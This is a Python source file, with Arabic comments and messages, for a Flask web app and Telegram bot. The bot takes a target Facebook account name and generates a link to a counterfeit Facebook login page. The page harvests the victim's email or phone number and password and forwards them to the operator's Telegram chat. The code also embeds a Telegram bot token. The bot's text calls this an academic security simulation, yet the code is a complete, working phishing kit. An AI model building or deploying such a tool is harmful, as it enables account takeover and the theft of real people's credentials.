import os
import flask
import telebot
import requests

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9104150951:AAE4JjeM6FQvFyvRfyUnxCWAyNmtp9CDV7s").strip()
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
app = flask.Flask(__name__)

# تخزين مؤقت للهدف وحفظ معرف المحادثة (Chat ID) لإرسال التنبيه إليه
target_data = {
    "username": "Facebook_Target",
    "chat_id": None
}

@app.route(f"/{TELEGRAM_BOT_TOKEN}", methods=['POST'])
def webhook():
    json_string = flask.request.get_data().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    target_data["chat_id"] = message.chat.id
    welcome_text = (
        "مرحباً بك يا إسماعيل في نظام محاكاة الأمان الأكاديمي. 🛡️\n\n"
        "أرسل اسم حساب الفيسبوك المستهدف الآن لنقوم بتوليد رابط المحاكاة الخاص به:"
    )
    bot.reply_to(message, welcome_text)

# استقبال اسم الحساب المستهدف من المهاجم
@bot.message_handler(func=lambda message: not message.text.startswith('/'))
def handle_target_input(message):
    target_data["chat_id"] = message.chat.id
    target_name = message.text.strip()
    target_data["username"] = target_name
    
    render_url = os.getenv("RENDER_EXTERNAL_URL", "http://127.0.0.1:10000")
    phishing_link = f"{render_url}/login"
    
    response_msg = (
        f"🎯 **تم تحديد الهدف بنجاح:** `{target_name}`\n\n"
        f"🔗 **رابط المحاكاة المُولد:**\n{phishing_link}\n\n"
        "قم بعرض هذا الرابط، وبمجرد إدخال البيانات ستصلك النتيجة هنا فوراً."
    )
    bot.reply_to(message, response_msg, parse_mode="Markdown")

# واجهة الويب المزيفة (صفحة تسجيل الدخول الوهمية)
@app.route("/login")
def phishing_page():
    current_target = target_data["username"]
    html_content = f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>تسجيل الدخول - فيسبوك</title>
        <style>
            body {{ font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
            .container {{ background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 350px; text-align: center; }}
            h2 {{ color: #1877f2; margin-bottom: 5px; }}
            p {{ color: #606770; font-size: 14px; margin-bottom: 20px; }}
            input {{ width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ccd0d5; border-radius: 6px; font-size: 14px; }}
            button {{ width: 95%; background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }}
            button:hover {{ background: #166fe5; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Facebook</h2>
            <p>تسجيل الدخول إلى حساب: <b>{current_target}</b></p>
            <form action="/capture" method="POST">
                <input type="text" name="identity" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                <input type="password" name="password" placeholder="كلمة المرور" required>
                <button type="submit">تسجيل الدخول</button>
            </form>
        </div>
    </body>
    </html>
    """
    return html_content

# معالجة البيانات المدخلة وإرسال الإشعار الفوري للبوت
@app.route("/capture", methods=['POST'])
def capture_data():
    identity = flask.request.form.get("identity")
    password = flask.request.form.get("password")
    target = target_data["username"]
    chat_id = target_data["chat_id"]
    
    alert_text = (
        "🚨 **تم التقاط بيانات المحاكاة بنجاح!**\n\n"
        f"👤 **الهدف:** `{target}`\n"
        f"📧 **البيانات المُدخلة:** `{identity}`\n"
        f"🔑 **كلمة المرور:** `{password}`\n"
        "⚡ *تمت العملية وتمرير البيانات عبر الخادم لحظياً.*"
    )
    
    if chat_id:
        send_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(send_url, json={"chat_id": chat_id, "text": alert_text, "parse_mode": "Markdown"})
        
    return "<h2 style='color: green; text-align: center; margin-top: 100px;'>تم التحقق بنجاح، شكراً لك.</h2>"

if __name__ == "__main__":
    RENDER_URL = os.getenv("RENDER_EXTERNAL_URL")
    if RENDER_URL:
        bot.remove_webhook()
        bot.set_webhook(url=f"{RENDER_URL}/{TELEGRAM_BOT_TOKEN}")
        
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
